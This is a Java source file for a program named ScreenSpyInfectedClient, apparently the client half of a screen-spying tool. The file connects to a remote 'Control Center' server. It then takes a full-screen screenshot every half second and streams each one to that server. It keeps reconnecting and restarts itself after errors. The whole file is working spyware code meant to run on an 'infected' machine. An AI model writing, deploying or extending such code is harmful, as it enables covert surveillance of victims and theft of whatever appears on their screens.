import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.net.Socket;

/**
 * Created by devasia on 4/23/15.
 */
public class ScreenSpyInfectedClient {

    private static final String IP_ADDRESS = "127.0.0.1";

    public static void main(String args[]) {

        /*
            - Connect to AWS Server
            - Take screenshots and send as BufferedImage
         */

        Socket s = null;

        try {

                s = new Socket(IP_ADDRESS, 8080);
                while (!s.isConnected()) {
                    s = new Socket(IP_ADDRESS, 8080);
                    try {
                        Thread.sleep(5000);
                    } catch (Exception e) {
                    }
                }

                s.setTcpNoDelay(true);
                System.out.println("Connected to Control Center");

            while (true) {

                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

                ImageIO.write(image, "png", s.getOutputStream());
                s.getOutputStream().flush();
                //s.close();

                System.out.println("Sent Screenshot");
                try {
                    Thread.sleep(500);
                } catch (Exception e) {
                }
            }

        } catch (Exception e) {

            e.printStackTrace();

            try {
                Thread.sleep(5000);
                if (s != null) {
                    s.close();
                }
                main(null);
            } catch (Exception ex) {
            }
        }
    }
}
